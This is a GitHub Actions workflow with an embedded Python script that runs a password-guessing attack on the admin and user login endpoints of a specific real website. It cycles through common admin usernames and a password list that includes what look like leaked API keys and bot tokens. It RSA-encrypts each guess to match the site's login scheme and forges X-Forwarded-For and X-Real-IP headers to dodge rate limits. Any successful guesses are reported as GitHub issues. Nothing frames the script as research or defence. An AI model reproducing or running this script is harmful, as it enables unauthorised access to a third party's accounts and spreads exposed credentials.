name: i3404q
on:
  workflow_dispatch:
    inputs:
      tag: {description: tag, required: false, type: string, default: "i3404"}
permissions:
  contents: read
  issues: write
jobs:
  q:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      max-parallel: 2
      matrix:
        include:
          - {mode: admin, half: 0}
          - {mode: user, half: 0}
    steps:
      - name: run
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          MODE: ${{ matrix.mode }}
          HALF: ${{ matrix.half }}
          TAG: ${{ inputs.tag }}
        run: |
          cat > /tmp/q2.py <<'PYEOF'
          import os, json, time, base64, random, urllib.parse, urllib.request, urllib.error
          
          MODE = os.environ.get("MODE", "admin")     # admin | user
          HALF = int(os.environ.get("HALF", "0"))    # 0 = users[:5], 1 = users[5:]
          TAG  = os.environ.get("TAG", "i3404")
          GH_TOKEN = os.environ.get("GH_TOKEN", "")
          REPO = os.environ.get("REPO", "")
          BASE = "https://api.kufaka.com"
          
          USERS = ["admin","administrator","superadmin","root","ceshi",
                   "firstwxx1","firstwxx","oper","19022075515"]
          PWS = [
              "XgFree-7Kp2Qv9Rt4Yb8Nc3Ws6Zh1Lm5Df",
              "45c3e7361c16bd84382d564489655990704dac8134b4e91e6e51269afd501552",
              "0ee53dbfbd351f3216b40e6542de47aa12e2a2277c59b8a4486d77080896cb26",
              "YT6LrDcK49sQZUINmwkdg1GIYH6cTx7upbIO",
              "wbk_9xW-PS161g5E9e50Egc7TGeugn724KVnHGytkSxXHJc",
              "sk-a2a-f002626da1c73ece9c8ac7ca23770b3b",
              "8460363222:AAFsbKUInvI2O2c-OfjdPE0fxby74BZgPYk",
              "VW5mlX5GDDkt", "Sx2026#QzWmR8tL4pN", "cddznsn", "19022075515", "68245612",
              "Test123456!", "hd18H9KjDNe51FN0wx",
              "admin", "123456", "admin123", "123456789", "admin888", "kufaka",
              "lbapi", "pojia", "ceshi123", "firstwxx",
          ]
          UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
          lines = []
          def out(s):
              print(s, flush=True); lines.append(s)
          
          def issue(title, body):
              if not (GH_TOKEN and REPO):
                  return
              try:
                  data = json.dumps({"title": title, "body": body[:60000]}).encode()
                  req = urllib.request.Request("https://api.github.com/repos/%s/issues" % REPO,
                                               data=data, method="POST")
                  req.add_header("Authorization", "token " + GH_TOKEN)
                  req.add_header("Accept", "application/vnd.github+json")
                  req.add_header("Content-Type", "application/json")
                  urllib.request.urlopen(req, timeout=30).read()
                  print("ISSUE_CREATED", flush=True)
              except Exception as e:
                  print("ISSUE_ERR %s" % str(e)[:200], flush=True)
          
          # ---- pure-python RSA PKCS1v15 ----
          def tlv(b, i):
              tag = b[i]; i += 1
              l = b[i]; i += 1
              if l & 0x80:
                  n = l & 0x7f
                  l = int.from_bytes(b[i:i + n], "big"); i += n
              return tag, b[i:i + l], i + l
          
          def pem_pub_nums(pem):
              txt = "".join(l.strip() for l in pem.strip().splitlines() if "-----" not in l)
              der = base64.b64decode(txt)
              _, v, _ = tlv(der, 0)                 # SubjectPublicKeyInfo SEQUENCE
              _, _, i = tlv(v, 0)                   # AlgorithmIdentifier
              _, bits, _ = tlv(v, i)                # BIT STRING
              _, seq, _ = tlv(bits[1:], 0)          # RSAPublicKey SEQUENCE
              _, n, j = tlv(seq, 0)                 # modulus
              _, e, _ = tlv(seq, j)                 # exponent
              return int.from_bytes(n, "big"), int.from_bytes(e, "big")
          
          def rsa_enc(n, e, msg):
              k = (n.bit_length() + 7) // 8
              m = msg.encode()
              ps_len = k - 3 - len(m)
              if ps_len < 8:
                  raise ValueError("msg too long")
              ps = bytes(random.randint(1, 255) for _ in range(ps_len))
              em = b"\x00\x02" + ps + b"\x00" + m
              c = pow(int.from_bytes(em, "big"), e, n)
              return base64.b64encode(c.to_bytes(k, "big")).decode()
          
          def rxff():
              return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                                      random.randint(0, 255), random.randint(1, 254))
          
          def http(method, path, headers, body=None, timeout=25):
              req = urllib.request.Request(BASE + path, data=(body.encode() if body is not None else None),
                                           method=method)
              for k, v in headers.items():
                  req.add_header(k, v)
              try:
                  r = urllib.request.urlopen(req, timeout=timeout)
                  return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
              except urllib.error.HTTPError as ex:
                  try:
                      b = ex.read().decode("utf-8", "replace")
                  except Exception:
                      b = ""
                  return ex.code, dict(ex.headers), b
              except Exception as ex:
                  return 0, {}, "ERR:%s" % type(ex).__name__
          
          def classify(text):
              if not text:
                  return "EMPTY"
              for bad in ("用户名或密码不正确", "用户名或密码错误", "密码错误", "请确保各项不能为空",
                          "密码解密失败", "操作频繁"):
                  if bad in text:
                      return "FAIL"
              if "访问已被拦截" in text or "auto_ratelimit" in text:
                  return "BLOCK"
              return "OTHER"
          
          def fetch_pubkey():
              last_st, last_b = -1, ""
              for attempt in range(25):
                  st, hd, b = http("GET", "/admin/auth/getPublicKey",
                                   {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                                    "Referer": "https://api.kufaka.com/admin/",
                                    "X-Forwarded-For": rxff()})
                  last_st, last_b = st, b
                  if st == 200 and "public_key" in b:
                      try:
                          n, e = pem_pub_nums(json.loads(b)["data"]["public_key"])
                          return (n, e), "admin/getPublicKey", None
                      except Exception as ex:
                          out("PUBKEY_PARSE_ERR %s" % ex)
                  st2, hd2, b2 = http("GET", "/user/auth/sysinfo",
                                      {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                                       "Referer": "https://api.kufaka.com/user/"})
                  if st2 == 200 and "public_key" in b2:
                      try:
                          n, e = pem_pub_nums(json.loads(b2)["data"]["public_key"])
                          return (n, e), "user/sysinfo", None
                      except Exception as ex:
                          out("PUBKEY_PARSE_ERR2 %s" % ex)
                  time.sleep(3)
              return None, "FAIL", "last_st=%s b=%r" % (last_st, last_b[:200])
          
          def attempt(method, path, hdrs, body, tries=5):
              last = (0, {}, "ERR:noattempt")
              for i in range(tries):
                  st, rh, rb = http(method, path, hdrs, body)
                  last = (st, rh, rb)
                  if st != 0:
                      return last, 0
                  time.sleep(1.5 + i)
              return last, 1
          
          def main():
              users = USERS[:5] if HALF == 0 else USERS[5:]
              out("START mode=%s half=%d users=%s npw=%d tag=%s" % (MODE, HALF, users, len(PWS), TAG))
          
              n = e = None
              if MODE == "admin":
                  (n, e), src, err = fetch_pubkey()
                  if n is None:
                      out("PUBKEY_FAIL %s" % err)
                      issue("i3404q %s mode=admin PUBKEY_FAIL" % TAG, "\n".join(lines)); return
                  out("PUBKEY ok src=%s bits=%d e=%d" % (src, n.bit_length(), e))
              else:
                  st, hd, b = http("GET", "/user/auth/sysinfo",
                                   {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                                    "Referer": "https://api.kufaka.com/user/"})
                  out("SYSINFO status=%s body=%r" % (st, b[:160]))
          
              tested = fails = blocks = neterr = 0
              others = []
              for u in users:
                  for pw in PWS:
                      xff = rxff()
                      hdrs = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded",
                              "X-Forwarded-For": xff,
                              "X-Real-IP": xff,
                              "Referer": "https://api.kufaka.com/%s/" % MODE}
                      if MODE == "admin":
                          try:
                              enc = rsa_enc(n, e, pw)
                          except Exception as ex:
                              out("ENC_ERR %s" % ex); continue
                          body = "username=%s&password=%s&totp=&enc=1" % (
                              urllib.parse.quote(u), urllib.parse.quote(enc))
                          path = "/admin/auth/login"
                      else:
                          body = "user=%s&pass=%s" % (urllib.parse.quote(u), urllib.parse.quote(pw))
                          path = "/user/auth/login"
                      (st, rh, rb), was_err = attempt("POST", path, hdrs, body)
                      tested += 1
                      if was_err or st == 0:
                          neterr += 1
                          out("NETERR %s %s/%s -> %s" % (MODE, u, pw, rb[:80]))
                          continue
                      cl = classify(rb) if st == 200 else ("BLOCK" if st in (403, 429) else "HTTP%d" % st)
                      if cl == "FAIL":
                          fails += 1
                      elif cl == "BLOCK":
                          blocks += 1
                      else:
                          others.append({"u": u, "pw": pw, "st": st, "te": rh.get("x-tengine-error", ""),
                                         "body": rb[:400]})
                          out("!! CAND %s %s/%s st=%s -> %s" % (MODE, u, pw, st, rb[:200]))
                      time.sleep(0.12)
                  out("PROG after=%s tested=%d fails=%d blocks=%d neterr=%d cand=%d"
                      % (u, tested, fails, blocks, neterr, len(others)))
          
              out("RESULT mode=%s half=%d tested=%d fails=%d blocks=%d neterr=%d cand=%d"
                  % (MODE, HALF, tested, fails, blocks, neterr, len(others)))
              issue("i3404q %s mode=%s half=%d tested=%d neterr=%d cand=%d" % (TAG, MODE, HALF, tested, neterr, len(others)),
                    "mode=%s half=%d users=%s\n\n" % (MODE, HALF, users) + "\n".join(lines) +
                    ("\n\nCANDIDATES:\n" + "\n".join(json.dumps(c) for c in others) if others else ""))
          
          main()
          PYEOF
          python3 -u /tmp/q2.py
